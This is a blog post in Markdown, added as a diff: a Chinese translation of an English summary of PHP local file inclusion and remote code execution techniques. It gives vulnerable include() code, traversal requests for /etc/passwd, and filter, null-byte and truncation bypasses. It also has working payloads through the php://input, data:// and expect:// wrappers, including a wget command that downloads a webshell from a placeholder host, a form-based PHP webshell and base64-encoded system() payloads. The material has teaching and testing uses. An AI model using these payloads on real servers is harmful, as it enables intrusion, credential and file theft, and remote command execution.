@@ -1,0 +1,274 @@
+---
+title: '[译]PHP——本地文件包含（LFI）和远程代码执行漏洞（RCE）总结'
+description: '本地文件包含（LFI）与远程代码执行（RCE）常见利用方式的翻译总结，覆盖目录遍历、空字节、过滤绕过、PHP wrapper 等技巧。'
+publishDate: '2017-11-25'
+read: 12
+tags: ['安全']
+img: '/assets/php-lfi-rec-summary-cover.jpg'
+img_alt: '[译]PHP——本地文件包含（LFI）和远程代码执行漏洞（RCE）总结'
+featured: false
+---
+
+本地文件包含（LFI）是一种 Web 服务器漏洞。它允许攻击者在 Web 服务器上包含本地文件。这是由于没有过滤用户输入而产生的。
+
+这可能导致：
+
+- 源代码或敏感信息泄漏；
+- 代码执行（服务器端/客户端）；
+- 拒绝服务（DoS）；
+- 我将使用 PHP 来演示该漏洞，当然 Perl、ASP、JSP 或其他语言也会存在该漏洞。
+
+**例1——LFI：服务器代码如下**
+
+```php
+<?php
+$file = $_GET['file'];
+if(isset($file))
+{
+  include($file);
+}
+```
+
+正常的请求方式：`http://example.com/index.php?file=contact.php`
+
+LFI 请求方式：`http://example.com/index.php?file=/etc/passwd`
+
+在这里，攻击者可以简单地修改 GET 请求，提供一个不在 Web 服务器里的文件，让服务器解析。
+
+**例2——目录遍历：服务器代码如下**
+
+```php
+<?php
+$file = $_GET['file'];
+if(isset($file))
+{
+  include('lib/functions/' . $file);
+}
+```
+
+正常的请求方式：`http://example.com/index.php?file=displaycontent.php`
+
+LFI 请求方式：`http://example.com/index.php?file=../../../../../etc/passwd`
+
+在这里，攻击者可以使用相对路径退出 Web 服务器文件夹。
+
+**例3——空字符注入：服务器代码如下**
+
+```php
+<?php
+$file = $_GET['file'];
+if(isset($file))
+{
+  include('lib/functions/' . $file . '.php');
+}
+```
+
+正常的请求方式：`http://example.com/index.php?file=displaycontent`
+
+LFI 请求方式：`http://example.com/index.php?file=../../../../../etc/passwd%00`
+
+这里的脚本强制使用 `.php` 扩展名，但是攻击者通过添加一个空字节的路径，可以删除扩展名。
+
+为什么？『%00』是十六进制的『0x00』的 HTTP 编码。这是空字符，一个空字节。在 C 语言中，它写为『\\0』，它表示字符串终止字符，程序在见到第一个『\\0』时就会认为该字符串结束了。
+
+PHP（与其他 Web 服务器一样）需要在系统级别处理高级代码，而且通常是使用 C/C++ 函数来完成的。所以分隔符后面的字符将被忽略。
+
+在 PHP 中，我们有这样的写法：`$tmp='try';`
+
+在 C 中，我们有这样的写法：
+
+```c
+char tmp[4];
+tmp[0] = 't';
+tmp[1] = 'r';
+tmp[2] = 'y';
+tmp[3] = '\\0';
+```
+
+所以，如果一个空字符注入进 PHP：`$tmp='try\\0next'`，在 C 中将产生下面结果：
+
+```c
+char tmp[9];
+tmp[0] = 't';
+tmp[1] = 'r';
+tmp[2] = 'y';
+tmp[3] = '\\0';
+tmp[4] = 'n';
+tmp[5] = 'e';
+tmp[6] = 'x';
+tmp[7] = 't';
+tmp[8] = '\\0';
+```
+
+更多细节可查看该网站：[传送门](http://www.madirish.net/401)
+
+**注：空字符注入的漏洞已在 PHP 5.3.4 当中被修复。**
+
+**例4——过滤绕过：服务器代码如下**
+
+Someone aware of previous vulnerabilities may think he will be secure with a proper filter like:
+有些人知道该地方有漏洞，使用一些过滤方式进行安全防御（这句好难翻译）：
+
+```php
+<?php
+$file = str_replace('../', '', $_GET['file']);
+if(isset($file))
+{
+  include('lib/functions/' . $file);
+}
+```
+
+正常的请求方式：`http://example.com/index.php?file=displaycontent`
+
+LFI 请求方式（HTTP 字符编码）：`http://example.com/index.php?file=..%2F..%2F..%2F..%2F..%2Fetc/passwd`
+
+LFI 请求方式（加倍所有字符）：`http://example.com/index.php?file=....//....//....//....//....//etc/passwd`
+
+该脚本是将输入的『../』全部替换，但若我们将斜杠、点进行编码，或者将其 double 变成『....//』呢？
+
+第一种方法不适用于最近的 PHP 版本，但是第二种方法几乎每次都能成功。
+
+**例5——双重编码**
+
+有时可以将 URL 中的一些字符进行编码以期绕过过滤机制，正如我们之前所看到的那样。这是因为浏览器对输入进行解码，但 PHP 没有。
+
+参考 OWASP：
+
+> 通过使用双重编码，可以绕过只解码一次用户输入的安全过滤机制。第二个解码过程由正确处理编码数据的后端平台或模块执行，但后端并没有相应的安全检查机制。
+
+例如，如果在 PHP 中使用了 `urlencode()`，那么要绕过过滤机制，需要使用双重编码：
+
+我们首次对数据进行编码，例如将 `../etc/passwd` 编码得到 `%2E%2E%2Fetc%2Fpasswd`
+
+再将 `%` 编码得到 `%252E%252E%252Fetc%252Fpasswd`
+
+**例6——路径截断**
+
+由于 PHP 5.3.4 以后的所有版本都不会受到空字符注入的影响，所以我们需要更多的方法来绕过过滤机制，例如：
+
+```php
+include('lib/functions/' . $_GET['file'] . '.php');
+```
+
+**说明：**
+
+1. 在 UNIX 使用 `/./etc/passwd` 和 `/etc/passwd` 是一样效果的；
+2. 而在 PHP 里，末尾的斜杠通常会被去掉，所以 `/etc/passwd/` 和 `/etc/passwd` 是一样的；
+3. 那么随着后面的斜杠被去掉了，我们可以添加尽可能多的斜杠，那么 `/etc/passwd//////` 与 `/etc/passwd` 也是一样的；
+4. 在 PHP 里，`./` 可以被追加到你想要的路径上，例如 `/etc/passwd/.`、`/etc/passwd/./`、`/etc/passwd/././.` 都是与 `/etc/passwd` 相同的。
+
+###### 还有一项有趣的功能可以绕过过滤机制。在 PHP 中，长度超过 4096 字节的文件名会被自动截断！4096 字节后的字符将被丢弃，不会触发错误。
+
+还等什么？让我们设计一个很长的路径来丢弃 PHP 扩展名！
+
+把你的请求附加一千次 `./` 将得到 `../../../etc/passwd/./././././<...>/././.php`
+
+而当文件名超过 4096 个字节，会删除超长部分，最终等于 `../../../etc/passwd`
+
+**例7——反向路径截断**
+
+路径截断也存在反向的版本。这可以通过尝试从开始到超过 MAX_PATH 值来填充文件名。
+
+但是这种方法有一个缺点：你必须插入精确的字节数来截断 `.php`。如果太多 `../` 被注入，文件名也将被截断。另外，因为增加的 `../` 已经占了 3 个字符，如果路径长度被限制了则无法使用反向路径截断。
+
+详情点击该 [传送门](http://blog.ptsecurity.com/2010/08/another-alternative-for-null-byte.html) 了解，可能你需要一些手段来打开。
+
+**例8——php://filter**
+
+你找到了 LFI 漏洞，包含文件时却看不到里面的内容？
+
+其实有些文件只能执行，不能查阅的，像 `config.php`、`libraries`。因此为了帮助我们打开它们，我们需要使用一些 PHP wrapper。
+
+```text
+index.php?page=php://filter/read=convert.base64-encode/resource=config
+```
+
+上面例子是一个著名的 PHP wrapper，这个过滤器将在 base64 中对页面进行编码，并显示结果。就像我们打开 `index.php?page=config`，并使用 Base64 将其转码。
+
+**例9——expect://**
+
+一个比较罕见但非常有效果的 wrapper，就是『expect://』，它允许通过 PHP 执行系统命令。但默认情况下未启用，需要安装扩展。
+
+`http://example.com/index.php?file=expect://ls`
+
+**例10——php://input**
+
+『php://input』允许通过 POST 请求发送 Payload。
+
+Request：`http://example.com/index.php?file=php://input`
+
+Post data（uploading a webshell）:
+
+```php
+<?php system('wget http://x.x.x.x/php-shell.php -O /var/www/html/shell.php'); ?>
+```
+
+Post data（getting server infos）:
+
+```php
+<?php phpinfo(); ?>
+```
+
+**例11——data://**
+
+『data://』可用于包含可执行 PHP 代码。
+
+```text
+http://example.com/index.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA2fPg%3d%3d
+```
+
+or
+
+```text
+http://example.com/index.php?file=data:text/plain;,<?php echo shell_exec($_GET['cmd']);?>
+```
+
+另一个有效的 Payload 是 `<?php phpinfo(); die();?>`
+
+die 语句将阻止执行脚本的其余部分或执行附加到流的错误解码扩展。
+
+一个更有用的 PHP Payload webshell：
+
+```php
+<form action='<?=$_SERVER['REQUEST_URI']?>' method='POST'><input type='text' name='x' value='<?=htmlentities($_POST['x'])?>'><input type='submit' value='cmd'></form><pre><? echo `{$_POST['x']}`; ?></pre ><? die(); ?>
+```
+
+ps：`</pre >` 这里用的时候记得将空格去掉。
+
+为了直接执行命令，数据请求 + Payload 可以是：
+
+```text
+data:,<?system($_GET['x']);?>&x=ls or data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls
+```
+
+最容易成功的方法是将 payload Base64 转码后再 URL 编码。
+
+**例12——zip:// and phar://**
+
+将一个 PHP 脚本压缩成 zip 或 phar（或其他文件和其他封装器），发送归档文件，并告知要读哪个文件：`zip://archive.zip#file.php`
+
+/proc/self/environ
+
+To come.
+
+/proc/self/fd/
+
+To come.
+
+Session Files
+
+To come.
+
+**例13——Including images**
+
+您可以在图像的结尾附加一些 PHP 代码并上传或包含它。
+
+**其他**
+
+I invite you to discover more attack vectors here.
+
+And don't forget that those methods can be combined.
+
+原文作者：Rawsec [原文连接](https://rawsec.ml/en/local-file-inclusion-remote-code-execution-vulnerability/)
+
+译者：脆骨 [个人博客:k-bone.com](http://www.k-bone.com/)
